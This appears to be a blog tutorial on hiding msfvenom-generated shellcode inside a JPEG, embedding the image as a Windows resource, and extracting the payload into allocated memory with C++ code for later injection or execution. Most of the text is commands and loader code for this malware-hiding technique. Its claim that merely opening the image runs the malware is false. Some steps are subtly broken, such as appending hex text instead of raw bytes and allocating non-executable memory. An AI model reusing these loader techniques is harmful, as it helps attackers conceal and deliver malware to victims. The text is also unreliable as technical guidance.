---
layout: default
---

# Hiding malware within an Image

The basic idea is to hide the malware inside the concatenated image file. The malware can be hidden in the binary data of the image file. This can be done by adding the malware code to the end of the image file, after the image data. When the concatenated image file is downloaded and opened, the image will display normally, but the malware code will be executed in the background.

1. Download a random image and find the length of byte. We can `xxd` for this purpose.

```
xxd -i saturn.jpg
```

![Saturn.jpg with XXD](/docs/resources/malware/saturn-xxd.jpg)

As shown above, the command precisely display the size of the image in bytes. Take a note.

2. Create a binary with msfvenom and find its size. For demonstration purposes, lets use a message box binary.

```bash
xxd -i msgbox64.bin
```

![msgbox](/docs/resources/malware/msgbox-size.png)

Once we have both the file length, concatenate the shellcode with the image file.

```bash
xxd -p msgbox64.bin | tr -d "\n" >> saturn.jpg
```

3. Create the resource file for the image.

```cpp
#include "resources.h"

IMAGE RCDATA "saturn.jpg"
```

Similarly the` resource.h` file

```cpp
#define IMAGE 100
```

4. Final code for reading the malicious image file for the resource would be:

```cpp
// Extract payload from resources section
res = FindResourceA(NULL, MAKEINTRESOURCE(IMAGE), RT_RCDATA);
resHandle = LoadResource(NULL, res);
image = (char *) LockResource(resHandle);
image_len = SizeofResource(NULL, res);
```

The `image` character pointer points to first byte of the malicios image, and `image_len` the corresponding length of the image.

5. Extract the shellcode

The `end` character pointer would point to the first byte of binary.

We know already made of note of image length as well as the shellcode length. We can find the corresponding offset that would point to the first byte of the shellcode.

```
offset = image + 2653; 
memcpy(p0,offset,336);

exec_mem = VirtualAlloc(0, 336, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
RtlMoveMemory(exec_mem, p0, 336);
```

We then use the `memcpy` command to copy the shellcode from the image to another location in memory `p0`. Using `VirtualAlloc` shellcode size memory is allocated. Then `RTLMoveMemory` function is used to copy the contents from `p0` memory block to a `exec_mem` memory block. At this point the code could be used to inject into a process or execute as a child process.




